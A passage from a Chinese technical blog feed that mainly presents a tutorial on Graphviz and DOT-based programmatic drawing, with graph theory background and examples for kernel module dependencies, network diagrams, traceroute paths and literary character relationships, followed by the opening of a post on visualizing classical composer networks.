<h2 id="扩展阅读：数据可视化"><a href="#扩展阅读：数据可视化" class="headerlink" title="扩展阅读：数据可视化"></a>扩展阅读：数据可视化</h2><ul>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-OmniGraffle/">数据可视化（一）思维利器 OmniGraffle 绘图指南 </a></li>
<li><a href="https://riboseyim.com/2016/04/26/Visualization-BestAppMap">数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测</a></li>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.com/2017/05/12/Visualization-GIS/">数据可视化（四）开源地理信息技术简史（Geographic Information System</a></li>
<li><a href="https://riboseyim.com/2017/05/12/Visualization-Charts/">数据可视化（五）基于网络爬虫制作可视化图表</a></li>
<li><a href="https://riboseyim.com/2017/11/23/Visualization-DashBoard/">数据可视化（六）常见的数据可视化仪表盘(DashBoard)</a></li>
<li><a href="https://riboseyim.com/2017/12/04/Visualization-Graphite/">数据可视化（七）Graphite 体系结构详解</a></li>
<li><a href="https://riboseyim.com/2018/12/16/Visualization-SocialNetwork/">数据可视化（八）Program,Data and Classical Music</a></li>
<li><a href="https://riboseyim.com/2018/01/15/Visualization-DataSource/">数据可视化（十）公共数据源列表</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://abruzzi.github.com/2018/06/real-time-data-visualization/">实时数据可视化</a></li>
<li><a href="https://blog.takipi.com/graphite-vs-grafana-build-the-best-monitoring-architecture-for-your-application/">Graphite vs. Grafana: Build the Best Monitoring Architecture for Your Application</a></li>
<li><a href="https://docs.influxdata.com/influxdb/v0.9/concepts/storage_engine/">influxdata.com: Storage Engine</a></li>
<li><a href="http://calvin1978.blogcn.com/articles/graphite.html">Graphite的百万Metrics实践之路</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>数据可视化</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title>数据可视化（三）基于 Graphviz 实现程序化绘图</title>
    <url>/2017/09/15/Visualization-Graphviz/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>从 OmniGraffle 自动布局说起</li>
<li>背景知识：图论</li>
<li>Graphviz 简介</li>
<li>最佳 Graphviz 实践(一)：流程图、数据结构图、网络路径 Trace Route</li>
<li>最佳 Graphviz 实践(二)：社会关系链分析（《红楼梦》、《权力的游戏》）</li>
<li>最佳 Graphviz 实践(三)：可视化函数调用、算法和数据结构可视化</li>
</ul>
<span id="more"></span>
<p>This article is part of an <strong>Data Visualization</strong> tutorial series. Make sure to check out my other articles as well:</p>
<ul>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-OmniGraffle/">数据可视化（一）思维利器 OmniGraffle 绘图指南 </a></li>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.com/2018/12/16/Visualization-SocialNetwork/">数据可视化（八）Program,Data and Classical Music</a></li>
</ul>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>我之前的 <a href="https://riboseyim.com/2017/09/15/Visualization-OmniGraffle/">数据可视化（一）思维利器 OmniGraffle 绘图指南 </a>曾提到了力导图，在上文结尾还吐槽了一番自动布局按钮的坑。在本文中我力求将这个坑填上。</p>
<p><a href="https://riboseyim.github.io/2017/09/15/Visualization-OmniGraffle/">OmniGraffle</a> 生成自动布局图形的基础是 Graphviz 引擎。Graphviz（Graph Visualization Software）是一个由AT&amp;T实验室启动的开源工具包，能够支持基于 <a href="#">DOT 脚本，文件扩展名通常是 .gv 或 .dot </a>的描述绘制图形。DOT 是一种文本图形描述语言，将生成的图形转换成多种输出格式的命令行工具，其输出格式包括PostScript，PDF，SVG，PNG，含注解的文本等。DOT 本身非常原始，提供了一种非常简单的描述图形的方法，同时意味着可以在命令行终端使用，或者被其它编程语言调用（Graphviz 就可以作为一个库使用）。这一点非常关键，基于 Graphviz 应用开发者不必掌握布局的复杂算法，而是可以把精力放在业务方面，将最后的图对象交给绘图引擎来处理即可。</p>
<p>有趣的是 Graphviz(Mac 版) 和 OmniGraffle 都曾获得<a href="#">苹果设计奖 Apple Design Awards</a>。</p>
<p>在深入掌握 Graphviz 及其相关衍生应用之前，我们有必要了解一些基础理论 —— 图论(Graph theory)。</p>
<h2 id="一、背景知识：图论-Graph-theory"><a href="#一、背景知识：图论-Graph-theory" class="headerlink" title="一、背景知识：图论(Graph theory)"></a>一、背景知识：图论(Graph theory)</h2><ul>
<li>柯尼斯堡七桥问题</li>
</ul>
<p>东普鲁士柯尼斯堡（今日俄罗斯加里宁格勒）市区跨普列戈利亚河两岸，河中心有两个小岛。小岛与河的两岸有七条桥连接。在所有桥都只能走一遍的前提下，如何才能把这个地方所有的桥都走遍？</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DATA_DOT_%E5%9B%BE%E8%AE%BA_%E6%9F%AF%E5%B0%BC%E6%96%AF%E5%A0%A1%E4%B8%83%E6%A1%A5%E9%97%AE%E9%A2%98.png" alt=""></p>
<p>许多数学家都尝试去寻找这类问题的解决方案，后来发展成为了数学中的图论。图论史上第一篇重要文献是莱昂哈德·欧拉在1736年发表在圣彼得堡科学院的《柯尼斯堡的七桥》。该论文证明了柯尼斯堡七桥问题中，符合条件的走法并不存在，同时提出和解决了一笔画问题。过桥问题可以抽象简化为平面上的点与线组合，每一座桥视为一条线，桥所连接的地区视为点。从这个点出发的线有奇数条称为奇点，从这个点出发的线有偶数条称为偶点。任意一种河──桥图能否全部走一次的判定法则： 如果存在两个以上（不包括两个）奇顶点，路线不存在；且有n个奇顶点的图至少需要n/2笔画出。</p>
<h4 id="1、经典适用场景"><a href="#1、经典适用场景" class="headerlink" title="1、经典适用场景"></a>1、经典适用场景</h4><ul>
<li>路径问题（柯尼斯堡七桥问题），最小生成树问题，斯坦纳树</li>
<li>网络流与匹配问题：最大流问题，最小割问题，最大流最小割定理，最小费用最大流问题，二分图及任意图上的最大匹配，带权二分图的最大权匹配</li>
<li>覆盖问题：最大团、最大独立集、最小覆盖集、最小支配集</li>
</ul>
<h4 id="2、经典算法"><a href="#2、经典算法" class="headerlink" title="2、经典算法"></a>2、经典算法</h4><ul>
<li>戴克斯特拉算法(D.A)</li>
<li>克鲁斯卡尔算法(K.A)</li>
<li>普里姆算法(P.A)</li>
<li>拓扑排序算法(TSA)</li>
<li>关键路径算法(CPA)</li>
<li>广度优先搜索算法(BFS)</li>
<li>深度优先搜索算法(DFS)</li>
</ul>
<h2 id="二、Graphviz-简明指南"><a href="#二、Graphviz-简明指南" class="headerlink" title="二、Graphviz 简明指南"></a>二、Graphviz 简明指南</h2><h4 id="1、Graphviz-布局器"><a href="#1、Graphviz-布局器" class="headerlink" title="1、Graphviz 布局器"></a>1、Graphviz 布局器</h4><p>总的来说，Graphviz 支持两类图：无向图（graph,用“ - - ”表示节点之间）和 有向图（digraph,用“ -&gt;” 表示节点之间）。顶点和边都具有各自的属性，比如形状，颜色，填充模式，字体，样式等。主要的布局器如下：</p>
<ul>
<li>dot: 默认布局方式，主要用于有向图(directed graphs)；</li>
<li>neato：基于 sprint model 模型，又称force-based 或者 energy minimized；</li>
<li>twopi：径向布局(radial layouts of graphs)，放射状；</li>
<li>circo：圆环布局(circular layout of graphs)；</li>
<li>fdp：无向图 (undirected graphs)；</li>
<li>sfdp: large undirected graphs patchwork 、squarified tree maps osage 、</li>
<li>dotty：一个用于可视化与修改图形的图形用户界面程序；</li>
<li>lefty：一个可以显示 DOT 图形的可编程控件，并允许用户用鼠标在图上执行操作。</li>
</ul>
<h4 id="2、Hello-World"><a href="#2、Hello-World" class="headerlink" title="2、Hello World!"></a>2、Hello World!</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ brew install graphviz</span><br><span class="line">$ dot -Tpng demo.dot -o demo.png</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">digraph demo&#123;</span><br><span class="line">  label=&quot;儿茶酚胺合成代谢路径&quot;;</span><br><span class="line"></span><br><span class="line">  酪氨酸 -&gt; L多巴 -&gt; 多巴胺 -&gt; 去甲肾上腺素 -&gt; 肾上腺素;</span><br><span class="line"></span><br><span class="line">  下丘脑 -&gt; 多巴胺;</span><br><span class="line">  交感神经元 -&gt; 去甲肾上腺素;</span><br><span class="line">  肾上腺髓质 -&gt; 去甲肾上腺素,肾上腺素;</span><br><span class="line"></span><br><span class="line">  酪氨酸 [label=&quot;酪氨酸&quot;,color=green];</span><br><span class="line">  多巴胺 [label=&quot;多巴胺&quot;, color=red];</span><br><span class="line">  肾上腺素 [label=&quot;肾上腺素&quot;, color=red];</span><br><span class="line"></span><br><span class="line">  下丘脑 [shape=box];</span><br><span class="line">  交感神经元 [shape=box];</span><br><span class="line">  肾上腺髓质 [shape=box];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DATA_DOT_Jisu_dot.png" alt="儿茶酚胺合成代谢路径-dot 布局"></p>
<h4 id="3、twopi-径向布局"><a href="#3、twopi-径向布局" class="headerlink" title="3、twopi 径向布局"></a>3、twopi 径向布局</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 缺省为 dot 布局</span></span><br><span class="line">$ dot -Kcirco -Tpng demo.dot -o demo.png</span><br></pre></td></tr></table></figure>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DATA_DOT_Jisu_Twopi.png" alt="儿茶酚胺合成代谢路径-twopi 径向布局"></p>
<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><h4 id="1、软件工程领域"><a href="#1、软件工程领域" class="headerlink" title="1、软件工程领域"></a>1、软件工程领域</h4><p>软件工程领域的主要应用：</p>
<ul>
<li>系统分析统一建模，时序图、用例图、类图、活动图、组件图、状态图、对象图等。</li>
<li>可视化函数调用、包依赖关系分析</li>
<li>可视化数据结构</li>
</ul>
<p>基于 Graphviz 的开源项目 PlantUML 支持快速绘制各类 UML 图形。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@startuml</span><br><span class="line">scale 600 width</span><br><span class="line"></span><br><span class="line">[*] -&gt; State1</span><br><span class="line">State1 --&gt; State2 : Succeeded</span><br><span class="line">State1 --&gt; [*] : Aborted</span><br><span class="line">State2 --&gt; State3 : Succeeded</span><br><span class="line">State2 --&gt; [*] : Aborted</span><br><span class="line">state State3 &#123;</span><br><span class="line">  state &quot;Accumulate Enough Data\nLong State Name&quot; as long1</span><br><span class="line">  long1 : Just a test</span><br><span class="line">  [*] --&gt; long1</span><br><span class="line">  long1 --&gt; long1 : New Data</span><br><span class="line">  long1 --&gt; ProcessData : Enough Data</span><br><span class="line">&#125;</span><br><span class="line">State3 --&gt; State3 : Failed</span><br><span class="line">State3 --&gt; [*] : Succeeded / Save Result</span><br><span class="line">State3 --&gt; [*] : Aborted</span><br><span class="line"></span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure>
<p>Linux 内核内部结构非常复杂，从概念上就由五个主要的子系统构成：进程调度器模块、内存管理模块、虚拟文件系统、网络接口模块和进程间通信模块。这些模块之间通过函数调用和共享数据结构进行数据交互，在涉及内核版本、应用程序升级等场景中，弄清楚模块之间的依赖关系非常重要。</p>
<p>lsmod 命令用于显示已经加载到内核中的模块的状态信息，Used by表示依赖的内容。通过 lsmod 命令获取依赖信息之后，简单处理就可以转化为图形，而且图形生成的全过程可以由程序固化。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ lsmod</span><br><span class="line">Module          Used by</span><br><span class="line">vboxdrv         vboxnetadp,vboxnetflt,vboxpci</span><br><span class="line">nf_reject_ipv4  ipt_REJECT</span><br><span class="line">ebtables        ebtable_filter</span><br><span class="line">ip6_tables      ip6table_filter</span><br><span class="line">ip6_udp_tunnel  vxlan</span><br><span class="line">udp_tunnel      vxlan</span><br><span class="line">xor             btrfs</span><br><span class="line">raid6_pq        btrfs</span><br><span class="line">nf_nat_masquerade_ipv4       ipt_MASQUERADE</span><br><span class="line">xfrm_algo        xfrm_user</span><br><span class="line">nf_defrag_ipv4        nf_conntrack_ipv4</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">digraph kernel&#123;</span><br><span class="line">        vboxdrv-&gt;vboxnetadp,vboxnetflt,vboxpci;</span><br><span class="line">        nf_reject_ipv4-&gt;ipt_REJECT;</span><br><span class="line">        ebtables-&gt;ebtable_filter;</span><br><span class="line">        ip6_tables-&gt;ip6table_filter;</span><br><span class="line">        ip6_udp_tunnel-&gt;vxlan;</span><br><span class="line">        udp_tunnel-&gt;vxlan;</span><br><span class="line">        <span class="keyword">xor</span>-&gt;btrfs;</span><br><span class="line">        raid6_pq-&gt;btrfs;</span><br><span class="line">        nf_nat_masquerade_ipv4-&gt;ipt_MASQUERADE;</span><br><span class="line">        xfrm_algo-&gt;xfrm_user;</span><br><span class="line">        nf_defrag_ipv4-&gt;nf_conntrack_ipv4;</span><br><span class="line"></span><br><span class="line">        ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DATA_DOT_Kernel_dep_3.png" alt="软件包依赖案例-Linux Kernel 3"></p>
<ul>
<li><a href="https://github.com/legendtkl/godag">godag: Go项目代码静态依赖分析</a></li>
</ul>
<h4 id="2、通信工程领域"><a href="#2、通信工程领域" class="headerlink" title="2、通信工程领域"></a>2、通信工程领域</h4><ul>
<li>nwdiag 是一个基于 Python 的、支持 Dot 脚本生成网络图的库</li>
<li>结合 GIS 信息追踪网络路由</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DATA_DOT_nwdiag_network.png" alt="网络拓扑图"><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install nwdiag</span><br><span class="line">nwdiag simple.diag</span><br><span class="line">nwdiag -Tsvg simple.diag</span><br></pre></td></tr></table></figure></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nwdiag &#123;</span><br><span class="line">  network dmz &#123;</span><br><span class="line">      address = <span class="string">&quot;210.x.x.x/24&quot;</span></span><br><span class="line"></span><br><span class="line">      web01 [address = <span class="string">&quot;210.x.x.1&quot;</span>];</span><br><span class="line">      web02 [address = <span class="string">&quot;210.x.x.2&quot;</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  network internal &#123;</span><br><span class="line">      address = <span class="string">&quot;172.x.x.x/24&quot;</span>;</span><br><span class="line"></span><br><span class="line">      web01 [address = <span class="string">&quot;172.x.x.1&quot;</span>];</span><br><span class="line">      web02 [address = <span class="string">&quot;172.x.x.2&quot;</span>];</span><br><span class="line">      db01;</span><br><span class="line">      db02;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DATA_DOT_Trace_Google.png" alt="traceroute 案例"><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@li1437-101 ~]# traceroute www.google.com</span><br><span class="line">traceroute to www.google.com (216.58.216.36), 30 hops max, 60 byte packets</span><br><span class="line"> 1  23.92.24.2 (23.92.24.2)  0.704 ms  0.736 ms 23.92.24.3 (23.92.24.3)  0.575 ms</span><br><span class="line"> 2  173.230.159.16 (173.230.159.16)  0.910 ms 173.230.159.14 (173.230.159.14)  2.265 ms</span><br><span class="line"> 		173.230.159.0 (173.230.159.0)  0.731 ms</span><br><span class="line"> 3  as15169.sfmix.org (206.197.187.50)  4.039 ms eqixsj-google-gige.google.com (206.223.116.21)  0.718 ms</span><br><span class="line"> 		as15169.sfmix.org (206.197.187.50)  3.944 ms</span><br><span class="line"> 4  108.170.242.227 (108.170.242.227)  4.902 ms</span><br><span class="line"> 		108.170.242.226 (108.170.242.226)  3.003 ms</span><br><span class="line"> 		108.170.243.2 (108.170.243.2)  3.064 ms</span><br><span class="line"> 5  216.239.47.37 (216.239.47.37)  4.836 ms 64.233.174.91 (64.233.174.91)  1.476 ms  1.447 ms</span><br><span class="line"> 6  216.239.54.22 (216.239.54.22)  12.464 ms  29.292 ms 64.233.174.204 (64.233.174.204)  9.032 ms</span><br><span class="line"> 7  209.85.245.172 (209.85.245.172)  10.633 ms</span><br><span class="line">    108.170.230.130 (108.170.230.130)  20.010 ms</span><br><span class="line"> 		108.170.230.124 (108.170.230.124)  8.988 ms</span><br><span class="line">10  lax02s22-in-f4.1e100.net (216.58.216.36)  10.358 ms  10.383 ms  10.301 ms</span><br></pre></td></tr></table></figure></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">digraph &#123;</span><br><span class="line">    label=<span class="string">&quot;Google Trace Sample&quot;</span>;</span><br><span class="line">    <span class="string">&quot;23.92.24.2&quot;</span> [label=<span class="string">&quot;23.92.24.2 \n Fremont,California \n location:37.5670,-121.9829&quot;</span>] ;</span><br><span class="line">    as15169 [label=<span class="string">&quot;as15169.sfmix.org \n San Francisco \n Metropolitan Internet Exchange&quot;</span>];</span><br><span class="line">    <span class="string">&quot;108.170.242.227&quot;</span> [label=<span class="string">&quot;108.170.242.227 \n California \n location:37.4192,-122.0574&quot;</span>];</span><br><span class="line">    lax02s22 [label=<span class="string">&quot;ax02s22-in-f4.1e100.net \n Los_Angeles,California \n location:46.07305,-100.546&quot;</span>];</span><br><span class="line">    <span class="string">&quot;23.92.24.2&quot;</span> -&gt; as15169 -&gt; <span class="string">&quot;108.170.242.227&quot;</span>  -&gt; lax02s22;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="3、社会工程领域"><a href="#3、社会工程领域" class="headerlink" title="3、社会工程领域"></a>3、社会工程领域</h4><ul>
<li>决策树(Decision Tree)：人群鄙视链</li>
<li>复杂人物关系链分析（《红楼梦》、《权力的游戏》）</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DATA_DOT_PK_Marry.png" alt="鄙视链案例-婚姻市场中的房市-dot"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DATA_DOT_PK_Marry_circo.png" alt="鄙视链案例-婚姻市场中的房市-circo-圆环布局"></p>
<p><strong>注意: 如果需要使用分组（Group）特性，子图的名称必须以“cluster”开头，否则无法识别</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">digraph family &#123;</span><br><span class="line">  label =&quot;《红楼梦》人物关系谱·主要角色&quot;;</span><br><span class="line"></span><br><span class="line">  subgraph cluster_皇族&#123;</span><br><span class="line">      label =&quot;皇族&quot;;</span><br><span class="line">      bgcolor=&quot;mintcream&quot;;</span><br><span class="line">      node [ color=&quot;lightyellow&quot;, style=&quot;filled&quot;];</span><br><span class="line"></span><br><span class="line">      北静王 [label = &quot;北静王&quot;,shape=&quot;Mrecord&quot;];</span><br><span class="line">      义忠顺王 [label = &quot;义忠顺王&quot;,shape=&quot;Mrecord&quot;];</span><br><span class="line"></span><br><span class="line">      贾元春 [label = &quot;贾元春（长女）\n 凤藻宫尚书·贤德妃&quot;,shape=&quot;Mrecord&quot;];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  subgraph cluster_宁国公&#123;</span><br><span class="line">      label =&quot;宁国公(西府)&quot;;</span><br><span class="line">      bgcolor=&quot;mintcream&quot;;</span><br><span class="line">      node [ color=&quot;green&quot;, style=&quot;filled&quot;];</span><br><span class="line"></span><br><span class="line">      贾演 [label = &quot;贾演 \n 宁国公&quot;];</span><br><span class="line"></span><br><span class="line">      贾代化[label = &quot;贾代化 \n 爵位：一等神威将军 \n 职务（武官）：京营节度使&quot;,shape=&quot;Mrecord&quot;];</span><br><span class="line">      贾演 -&gt; 贾代化[label = &quot;子&quot;];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://riboseyim-qiniu.riboseyim.com/red-family-all-master.png" alt="《红楼梦》人物关系谱·主要角色"></p>
<h3 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h3><ul>
<li><a href="https://renenyffenegger.ch/notes/tools/Graphviz/examples/index">Graphviz (dot) examples</a></li>
<li><a href="https://medium.com/@Arafat./introducing-dataviz-a-data-structure-visualization-library-for-golang-f6e60663bc9d">Introducing DataViz a data-structure visualization library for Golang</a></li>
<li><a href="https://github.com/bradleyjkemp/memmap">memmap: Visualize Data Structures using Graphvi (Turns arbitrary data structures into more easily understood graphs.)</a></li>
<li><a href="http://blockdiag.com/en/index.html">Python blockdiag</a></li>
<li><a href="http://eloquentjavascript.net/16_canvas.html">Book《Eloquent JavaScript》| Written by Marijn Haverbeke</a></li>
</ul>
<h2 id="扩展阅读：数据可视化"><a href="#扩展阅读：数据可视化" class="headerlink" title="扩展阅读：数据可视化"></a>扩展阅读：数据可视化</h2><ul>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-OmniGraffle/">数据可视化（一）思维利器 OmniGraffle 绘图指南 </a></li>
<li><a href="https://riboseyim.com/2016/04/26/Visualization-BestAppMap">数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测</a></li>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.com/2017/05/12/Visualization-GIS/">数据可视化（四）开源地理信息技术简史（Geographic Information System</a></li>
<li><a href="https://riboseyim.com/2017/05/12/Visualization-Charts/">数据可视化（五）基于网络爬虫制作可视化图表</a></li>
<li><a href="https://riboseyim.com/2017/11/23/Visualization-DashBoard/">数据可视化（六）常见的数据可视化仪表盘(DashBoard)</a></li>
<li><a href="https://riboseyim.com/2017/12/04/Visualization-Graphite/">数据可视化（七）Graphite 体系结构详解</a></li>
<li><a href="https://riboseyim.com/2018/12/16/Visualization-SocialNetwork/">数据可视化（八）Program,Data and Classical Music</a></li>
<li><a href="https://riboseyim.com/2018/01/15/Visualization-DataSource/">数据可视化（十）公共数据源列表</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.researchgate.net/publication/216633938_Graphviz_and_Dynagraph_--_Static_and_Dynamic_Graph_Drawing_Tools?enrichId=rgreq-a202987690a5ed5bd3960ba1691b80e8-XXX&amp;enrichSource=Y292ZXJQYWdlOzIxNjYzMzkzODtBUzoxMDQ2MTMzODI0NTk0MDJAMTQwMTk1MzE4MzExNA%3D%3D&amp;el=1_x_2&amp;_esc=publicationCoverPdf">Article:Grphviz and Dynagraph — Static and Dynamic Graph Drawing Tools | 2004</a></li>
<li>Emden Gansner (Google Inc.)</li>
<li>Stephen C. North (Infovisible)</li>
<li>Eleftherios Koutsofios (AT&amp;T)</li>
<li>Emden Gansner (AT&amp;T Labs - Research)</li>
<li><a href="http://www.emis.de/journals/JGAA/accepted/2004/HarelKoren2004.8.2.pdf">Graph Drawing by High-Dimensional Embedding | David Harel 《Journal of Graph Algorithms and Applications》</a></li>
<li><a href="http://www.graphviz.org/pdf/dotguide.pdf">dotguide: Drawing graphs with dot | January 5,2015</a></li>
<li><a href="https://www.ibm.com/developerworks/cn/linux/l-graphvis/">用 Graphviz 可视化函数调用 | IBM developerworks ,2005</a></li>
<li><a href="http://abruzzi.github.com/2015/11/using-graphviz-drawing/">邱俊涛：使用graphviz绘制流程图（2015版）</a></li>
<li><a href="https://py131.github.io/2017/04/03/%E5%91%A8%E5%BF%97%E5%8D%8E%E3%80%8A%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E3%80%8B%E4%B9%A0%E9%A2%98%E8%A7%A3%E7%AD%94/%E5%91%A8%E5%BF%97%E5%8D%8E%E3%80%8A%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E3%80%8B%E4%B9%A0%E9%A2%98%E8%A7%A3%E7%AD%94%EF%BC%9ACh4.3%20-%20%E7%BC%96%E7%A8%8B%E5%AE%9E%E7%8E%B0ID3%E7%AE%97%E6%B3%95/">周志华《机器学习》习题解答：Ch4.3 - 编程实现ID3算法</a></li>
<li><a href="http://python.jobbole.com/87994/">机器学习算法实践-决策树(Decision Tree)</a></li>
<li><a href="https://segmentfault.com/a/1190000004646829">Sike:UML绘制-dot语言</a></li>
<li><a href="https://www.zhihu.com/question/32098665">类似Graphviz的工具是如何实现自动排版的？ | 知乎</a></li>
<li><a href="http://www.managershare.com/post/222620">你在鄙视链的哪一层？</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA4NTU2MTg3MQ==&amp;mid=2655161061&amp;idx=1&amp;sn=6b1e046d152397ace5769ec70c1df76e&amp;chksm=84602d85b317a493c4b25aa3681029fa6f2ccf3f328c9ee2a538f6d4e849465267ed12a8c116&amp;mpshare=1&amp;scene=1&amp;srcid=0910QR98pyrCcNyEcbfwfkRe%23rd">扒完社交网络关系才明白，《权力的游戏》凭什么是神作 | EGO影视荟</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>数据可视化</tag>
        <tag>Developer</tag>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title>数据可视化（八）Program,Data and Classical Music</title>
    <url>/2018/12/16/Visualization-SocialNetwork/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>基于 Go + R  可视化古典音乐作曲家社交网络</li>
<li>Coperformance 是一个业余项目，融合了作者对编程，数据和古典音乐的兴趣爱好。</li>
<li>Key Words: Go , R , Composer , Visualization</li>
</ul>
<span id="more"></span>
<p><img src="http://riboseyim-qiniu.riboseyim.com/R-Go-Music-Theme-2.png" alt=""></p>
<ul>
<li>原标题：Using Data to Visualize Connections Between Composers</li>
<li>链接：<a href="https://overthinkdciscores.com/2018/12/03/using-data-to-visualize-connections-between-composers">https://overthinkdciscores.com/2018/12/03/using-data-to-visualize-connections-between-composers</a></li>
<li>作者：<a href="https://github.com/EMurray16">Evan Murray</a></li>
<li>发表时间：12/03/2018</li>
</ul>
<p>编程很有趣。我们能够制作很酷的东西，甚至无需考虑它对现实世界是否有实际用途。Coperformance 是一个业余项目，融合了作者对编程，数据和古典音乐的兴趣爱好。通过可视化应用 —— 我们可以从一个新的角度理解古典音乐作曲家以及他们之间的微妙联系。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/R-Go-Music-1.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/R-Go-Music-2.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/R-Go-Music-3.png" alt=""></p>
<p>该项目得以实现归功于纽约爱乐乐团这座艺术宝库 —— 它们建立了一个 <a href="https://github.com/nyphilarchive/PerformanceHistory">Github 库</a>以保存该团历史上所有的演出曲目。库中包含了大量信息，包括演出时间、地点，作曲家信息，独奏者信息，甚至是幕间休息的数据。这些数据都以 XML 或 JSON 格式编码，任何编程语言都可以解析和分析。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;programs&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;id&quot;</span>: <span class="string">&quot;38e072a7-8fc9-4f9a-8eac-3957905c0002&quot;</span>, <span class="comment">// GUID</span></span><br><span class="line">      <span class="string">&quot;programID&quot;</span>: <span class="string">&quot;3853&quot;</span>, <span class="comment">// NYP Local ID</span></span><br><span class="line">      <span class="string">&quot;orchestra&quot;</span>: <span class="string">&quot;New York Philharmonic&quot;</span>,</span><br><span class="line">      <span class="string">&quot;season&quot;</span>: <span class="string">&quot;1842-43&quot;</span>,</span><br><span class="line">      <span class="string">&quot;concerts&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="string">&quot;eventType&quot;</span>: <span class="string">&quot;Subscription Season&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Location&quot;</span>: <span class="string">&quot;Manhattan, NY&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Venue&quot;</span>: <span class="string">&quot;Apollo Rooms&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Date&quot;</span>: <span class="string">&quot;1842-12-07T05:00:00Z&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Time&quot;</span>: <span class="string">&quot;8:00PM&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">/* A program can have multiple concerts */</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">&quot;works&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&quot;ID&quot;</span>: <span class="string">&quot;8834*4&quot;</span>, <span class="comment">// e.g. &quot;1234*1&quot; - first part is the Work ID, second part is the NYP Movement ID</span></span><br><span class="line">          <span class="string">&quot;composerName&quot;</span>: <span class="string">&quot;Weber,  Carl  Maria Von&quot;</span>,</span><br><span class="line">          <span class="string">&quot;workTitle&quot;</span>: <span class="string">&quot;OBERON&quot;</span>,</span><br><span class="line">          <span class="string">&quot;movement&quot;</span>: <span class="string">&quot;\&quot;Ozean, du Ungeheuer\&quot; (Ocean, thou mighty monster), Reiza (Scene and Aria), Act II&quot;</span>,</span><br><span class="line">          <span class="string">&quot;conductorName&quot;</span>: <span class="string">&quot;Timm, Henry C.&quot;</span>,</span><br><span class="line">          <span class="string">&quot;soloists&quot;</span>: 